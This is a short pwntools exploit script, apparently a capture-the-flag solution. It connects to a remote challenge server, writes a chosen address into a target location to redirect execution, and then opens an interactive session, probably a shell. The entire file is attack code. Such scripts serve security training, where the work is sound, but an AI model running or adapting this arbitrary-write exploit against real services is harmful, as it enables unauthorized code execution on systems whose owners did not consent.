from pwn import *

r = remote("exp.zip", 56002)


r.recvuntil(b"write :")

r.sendline(b'404020')

r.recvuntil(b"data :")

r.sendline(p64(0x4011F6))

r.interactive()

